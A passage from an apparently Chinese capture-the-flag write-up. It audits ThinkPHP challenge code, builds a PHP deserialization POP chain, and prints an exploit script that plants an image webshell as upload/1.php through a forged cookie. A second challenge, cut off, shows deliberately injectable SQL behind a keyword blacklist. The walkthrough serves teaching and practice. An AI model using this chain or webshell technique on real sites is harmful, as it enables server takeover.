class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="variable">$profile</span>=cookie(<span class="string">&#x27;user&#x27;</span>);  </span><br><span class="line">        <span class="keyword">if</span>(!emptyempty(<span class="variable">$profile</span>))&#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode(<span class="variable">$profile</span>));  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&quot;ID&quot;</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;find();  </span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_upload_img</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(!emptyempty(<span class="keyword">$this</span>-&gt;profile) &amp;&amp; !emptyempty(<span class="keyword">$this</span>-&gt;profile_db))&#123;  </span><br><span class="line">            <span class="keyword">if</span>(emptyempty(<span class="keyword">$this</span>-&gt;profile_db[<span class="string">&#x27;img&#x27;</span>]))&#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        cookie(<span class="string">&quot;user&quot;</span>,<span class="literal">null</span>);  </span><br><span class="line">        <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);  </span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>仔细审阅代码后发现，对我们有价值的函数主要是<code>login_check()</code>函数，首先将cookie赋值<code>$profile</code>变量，如果不为空则通过<code>$this-&gt;profile=unserialize(base64_decode(\$profile));</code>语句将其进行base64编码然后反序列化，最后进入数据库比对信息，如果无误则返回1。<code>check_upload_img()</code>函数负责检查<code>profile_db[&#39;img&#39;]</code>是否为空，即上传内容是否为图片；<code>login_check()</code>函数负责检查是否登录。</p><p>下面再来分析一下register.php。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;  </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checker) &#123;  </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;  </span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/home&quot;</span>;  </span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);  </span><br><span class="line">                <span class="keyword">exit</span>();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> (!emptyempty(input(<span class="string">&quot;post.username&quot;</span>)) &amp;&amp; !emptyempty(input(<span class="string">&quot;post.email&quot;</span>)) &amp;&amp; !emptyempty(input(<span class="string">&quot;post.password&quot;</span>))) &#123;  </span><br><span class="line">            <span class="variable">$email </span>= input(<span class="string">&quot;post.email&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;addslashes&quot;</span>);  </span><br><span class="line">            <span class="variable">$password </span>= input(<span class="string">&quot;post.password&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;addslashes&quot;</span>);  </span><br><span class="line">            <span class="variable">$username </span>= input(<span class="string">&quot;post.username&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;addslashes&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check_email(<span class="variable">$email</span>)) &#123;  </span><br><span class="line">                <span class="keyword">if</span> (emptyempty(db(<span class="string">&quot;user&quot;</span>)-&gt;where(<span class="string">&quot;username&quot;</span>, <span class="variable">$username</span>)-&gt;find()) &amp;&amp; emptyempty(db(<span class="string">&quot;user&quot;</span>)-&gt;where(<span class="string">&quot;email&quot;</span>, <span class="variable">$email</span>)-&gt;find())) &#123;  </span><br><span class="line">                    <span class="variable">$user_info </span>= [<span class="string">&quot;email&quot;</span> =&gt; <span class="variable">$email</span>, <span class="string">&quot;password&quot;</span> =&gt; md5(<span class="variable">$password</span>), <span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span>];  </span><br><span class="line">                    <span class="keyword">if</span> (db(<span class="string">&quot;user&quot;</span>)-&gt;insert(<span class="variable">$user_info</span>)) &#123;  </span><br><span class="line">                        <span class="keyword">$this</span>-&gt;registed = <span class="number">1</span>;  </span><br><span class="line">                        <span class="keyword">$this</span>-&gt;success(<span class="string">&#x27;Registed successful!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                        <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Registed failed!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                    <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Account already exists!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Email illegal!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Something emptyempty!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_email</span>(<span class="params"><span class="variable">$email</span></span>)</span>&#123;  </span><br><span class="line">        <span class="variable">$pattern </span>= <span class="string">&quot;/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/&quot;</span>;  </span><br><span class="line">        preg_match(<span class="variable">$pattern</span>, <span class="variable">$email</span>, <span class="variable">$matches</span>);  </span><br><span class="line">        <span class="keyword">if</span>(emptyempty(<span class="variable">$matches</span>))&#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>本文件中发现调用了魔术方法<code>__destruct()</code>，<code>if(!$this-&gt;registed)  $this-&gt;checker-&gt;index();</code>这两句话意思是如果检测到用户未注册，则调用index.php的<code>index()</code>函数进行登录检测。<code>register()</code>函数主要负责用户注册；<code>check_email($email)</code>函数主要负责检查用户填写的email格式是否正确。</p><p>下面来看一下重点文件Proflie.php，首先来看<code>upload_img()</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;  </span><br><span class="line">           <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;  </span><br><span class="line">               <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;  </span><br><span class="line">               <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);  </span><br><span class="line">               <span class="keyword">exit</span>();  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">if</span>(!emptyempty(<span class="variable">$_FILES</span>))&#123;  </span><br><span class="line">           <span class="keyword">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];  </span><br><span class="line">           <span class="keyword">$this</span>-&gt;filename=md5(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;  </span><br><span class="line">           <span class="keyword">$this</span>-&gt;ext_check();  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;  </span><br><span class="line">           <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;  </span><br><span class="line">               @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);  </span><br><span class="line">               @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);  </span><br><span class="line">               <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;  </span><br><span class="line">               <span class="keyword">$this</span>-&gt;update_img();  </span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">               <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">           <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));  </span><br><span class="line">       &#125;  </span><br><span class="line">   &#125;  </span><br></pre></td></tr></table></figure><p>主要逻辑是检查用户是否登录，如果登录则判断文件是否为空，检查文件后缀是否正常，设置文件命名规则为<code>md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;</code>并存入，这样就杜绝了文件名上传漏洞。另外还有两个重要的魔术方法，如下所示。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[<span class="variable">$name</span>];  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>由于当对象调用不可访问属性时，就会自动触发<code>__get</code>魔法方法，而在对象调用不可访问函数时，就会自动触发<code>__call</code>魔法方法，那么可以使用Register.php中的 <code>__destruct()</code>方法来调用<code>index()</code>方法，如果此时将<code>checker</code>的<code>construct</code>覆盖为类<code>Profile</code>，必然会触发<code>__call</code>魔法方法，在该方法中会触发<code>$this-&gt;index</code>，但显然该对象并不存在，于是可触发<code>__get</code>魔法方法，那么会执行语句<code>return $this-&gt;except[&#39;index&#39;];</code>只要将<code>except</code>赋值为数组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);  </span><br></pre></td></tr></table></figure><p>即可成功触发<code>upload_img()</code>函数，进行文件复制和改名。</p><p>POP链如下：</p><p><img src="/img/popchain.png"></p><p>下面用Antsword生成shell：</p><p><img src="/img/19f3ffd25a8114acc55d7a689541c39a.png">将代码附于一张正常图片之后，上传图片马，右键图片查看路径：<code>…upload/bc3f8b539fdf9334d29684c320f7f0d5/d10c88f869301b1238f53cfdff8e9d7c.png</code>然后运行之前使用POP链构造的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Register();  </span><br><span class="line"><span class="variable">$a</span>-&gt;registed=<span class="number">0</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;checker=<span class="keyword">new</span> Profile();  </span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;except=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);  </span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;ext=<span class="number">1</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;filename_tmp=<span class="string">&quot;./upload/bc3f8b539fdf9334d29684c320f7f0d5/d10c88f869301b1238f53cfdff8e9d7c.png&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;filename=<span class="string">&quot;./upload/1.php&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>得到新的cookie，使用Cookie Editor修改当前cookie：</p><p><img src="/img/027be2522cc4a888a92a695255c70ee8.png"></p><p>刷新一下，然后访问<code>…/upload/</code>，可以发现1.php已经出现在了upload页面里。</p><p><img src="/img/1a22b46f30367e0dbad5d3eab9d0cba5.png"></p><p>进入后shell脚本已经开始工作了：</p><p><img src="/img/af75696ed0aea235eb19fe660e1e8726.png">连接Antsword进入根目录即可获得flag。</p><h2 id="Background-Management-System-（难度：8-10）"><a href="#Background-Management-System-（难度：8-10）" class="headerlink" title="Background_Management_System （难度：8/10）"></a>Background_Management_System （难度：8/10）</h2><p>首先使用dirsearch扫描一下，发现疑似有源码泄露：</p><p><img src="/img/f5e108b52ea8b6721d9d4ad6bb9e61ba.png"></p><p>打开后可以发现网站是基于<code>ThinkPHP</code>框架开发的。</p><p><img src="/img/856f51de27d6ca92f8876dd30875b28f.png">下面进行代码审计。首先来看Register.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;  </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Db</span>;  </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;  </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Validate</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Userinfo</span> <span class="keyword">extends</span> <span class="title">Controller</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user</span>(<span class="params">Request <span class="variable">$request</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$session </span>= <span class="variable">$request</span>-&gt;session(<span class="string">&#x27;username&#x27;</span>);  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$session </span>=== <span class="string">&#x27;admin&#x27;</span>)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">return</span> view(<span class="string">&#x27;user&#x27;</span>,[<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&#x27;welcome admin!!&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="string">&#x27;This is your hint:   &lt;br&gt;hint&#123;xxxxxxxxxx&#125;&#x27;</span>]);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">return</span> view(<span class="string">&#x27;user&#x27;</span>,[<span class="string">&#x27;info&#x27;</span>=&gt;<span class="string">&quot;hello <span class="subst">&#123;$session&#125;</span>&quot;</span>,<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="string">&#x27;This is your hint:   &lt;br&gt;flag&#123;&#125;&lt;br&gt;maybe the admin have some hints:)&#x27;</span>]);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> view();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">changeinfo</span>(<span class="params">Request <span class="variable">$request</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="variable">$dbuser </span>=<span class="string">&#x27;*****&#x27;</span>;  </span><br><span class="line">        <span class="variable">$dbpass </span>=<span class="string">&#x27;*****&#x27;</span>;  </span><br><span class="line">        <span class="variable">$dbname </span>=<span class="string">&quot;study&quot;</span>;  </span><br><span class="line">        <span class="variable">$host </span>= <span class="string">&#x27;localhost&#x27;</span>;  </span><br><span class="line">        @error_reporting(<span class="number">0</span>);  </span><br><span class="line">        @<span class="variable">$con </span>= mysqli_connect(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>,<span class="variable">$con</span>);  </span><br><span class="line">        <span class="comment">// Check connection  </span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Failed to connect to MySQL: &quot;</span> . mysqli_error();  </span><br><span class="line">        &#125;  </span><br><span class="line">        @mysqli_select_db(<span class="variable">$con</span>,<span class="variable">$dbname</span>) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">&quot;Unable to connect to the database: <span class="subst">$dbname</span>&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="variable">$post </span>= <span class="variable">$request</span>-&gt;post();  </span><br><span class="line">        <span class="variable">$username </span>= <span class="variable">$request</span>-&gt;session(<span class="string">&#x27;username&#x27;</span>);  </span><br><span class="line">        <span class="variable">$pass </span>= <span class="variable">$post</span>[<span class="string">&#x27;password&#x27;</span>];  </span><br><span class="line">        <span class="variable">$curr_pass </span>= <span class="variable">$post</span>[<span class="string">&#x27;current_password&#x27;</span>];  </span><br><span class="line">        <span class="variable">$validate </span>= Validate::make([<span class="string">&#x27;password&#x27;</span>=&gt;<span class="string">&#x27;min:3|confirm&#x27;</span>]);  </span><br><span class="line">        <span class="variable">$status </span>= <span class="variable">$validate</span>-&gt;check(<span class="variable">$post</span>);  </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$status</span>)&#123;  </span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&quot;/select|update|delete|insert|into|set|;|between|regexp|like|rlike|=|substr|mid|ascii|join|char|order|count|rand|floor|group|extractvalue|updatexml|exp|concat|outfile|\(|\)/i&quot;</span>, <span class="variable">$curr_pass</span>) || preg_match(<span class="string">&quot;/select|update|delete|insert|into|set|;|between|regexp|like|rlike|=|substr|mid|ascii|join|char|order|count|rand|floor|group|extractvalue|updatexml|exp|concat|outfile|\(|\)/i&quot;</span>, <span class="variable">$pass</span>)) &#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;success(<span class="string">&#x27;go out!! hacker&#x27;</span>,<span class="string">&#x27;/xinan/public/index/index/index&#x27;</span>);  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="variable">$sql </span>= <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;  </span><br><span class="line">                <span class="variable">$res </span>= mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>) <span class="keyword">or</span> <span 